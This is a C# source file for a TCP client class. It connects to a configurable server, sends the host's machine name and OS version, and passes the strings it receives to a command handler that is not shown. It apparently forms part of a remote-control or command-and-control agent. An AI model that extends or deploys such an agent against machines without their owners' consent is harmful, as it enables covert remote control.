namespace Core.Connection
{
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Text;
    using System.Threading;

    using Core.Command;

    public class Connection
    {
        private const string LOCAL_ADDRESS = @"127.0.0.1";
        private const int PORT_NUMBER = 100;

        private const int SECONDS_TO_RETRY = 1500;
        private const int TRIES_RECEIVED = 5;

        private Socket _socket;
        private EndPoint _endPoint;

        private readonly Command _command;

        private int _tries;

        #region Constructor

        public Connection(
            string ipAddress = LOCAL_ADDRESS,
            int portNumber = PORT_NUMBER)
        {
            Console.ForegroundColor = ConsoleColor.Green;

            Console.WriteLine("Initializing the Connection Host:{0} Port:{1}", ipAddress, portNumber);
            _command = new Command(this);
        }

        #endregion

        #region Methods

        public EndPoint ConfigureEndPoint(
            string ipAddress = LOCAL_ADDRESS,
            int portNumber = PORT_NUMBER)
        {
#pragma warning disable CS0618 // Type or member is obsolete
            var ipHostInfo = Dns.Resolve(ipAddress);
#pragma warning restore CS0618 // Type or member is obsolete

            var ipAddressSolved = ipHostInfo.AddressList[0];
            var remoteEP = new IPEndPoint(ipAddressSolved, portNumber);

            return remoteEP;
        }

        public Socket ConfigureSocket() => new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        public void ConfigureClient(
            string ipAddress = LOCAL_ADDRESS,
            int portNumber = PORT_NUMBER)
        {
            if (_endPoint == null || _socket == null)
            {
                _tries = 0;

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Configurating client with the host {0} in the port {1}", ipAddress, portNumber);

                _endPoint = ConfigureEndPoint(ipAddress, portNumber);
                _socket = ConfigureSocket();
            }

            if (!_socket.Connected)
            {
                ConnectAsync(ipAddress, portNumber);
            }
        }

        public void ConnectAsync(
            string ipAddress = LOCAL_ADDRESS,
            int portNumber = PORT_NUMBER)
        {
            try
            {
                Console.WriteLine("Trying to connect with the host {0} in the port {1}", ipAddress, portNumber);

                if (!_socket.Connected)
                {
                    _socket.Connect(_endPoint);

                    //Nos conectamos con el cliente
                    SendData(string.Format("|informa|{0}|{1}|", Environment.MachineName, Environment.OSVersion.VersionString));

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("Socket connected to {0}",
                    _socket.RemoteEndPoint.ToString());
                }
            }
            catch (Exception e)
            {
                _socket = null;
                throw e;
            }
        }

        public void ReceiveInformation()
        {
            try
            {
                if (!_socket.Connected) return;

                // Create the state object.
                var buffer = new byte[byte.MaxValue - 1];

                _socket.Receive(buffer);

                var bufferString = Encoding.ASCII.GetString(buffer).Trim('\0');

                if (!string.IsNullOrEmpty(bufferString))
                {
                    // Begin receiving the data from the remote device.
                    UseCommand(bufferString);
                }
                else
                {
                    if (_tries >= TRIES_RECEIVED)
                    {
                        throw new Exception("Server has disconnected.");
                    }

                    Thread.Sleep(SECONDS_TO_RETRY);

                    _tries++;
                }
            }
            catch (Exception e)
            {
                _socket = null;
                throw e;
            }
        }

        private void UseCommand(string command)
        {
            try
            {
                // Logic for understand the commands provided by server
                _command.DetectCommand(command);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public int SendData(string data)
        {
            if (_socket == null || !_socket.Connected)
            {
                return -1;
            }

            try
            {
                return _socket.Send(Encoding.ASCII.GetBytes(data));
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public int SendBytes(byte[] bytesBuffer)
        {
            if (_socket == null || !_socket.Connected)
            {
                return -1;
            }

            try
            {
                return _socket.Send(bytesBuffer);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }


        #endregion
    }
}
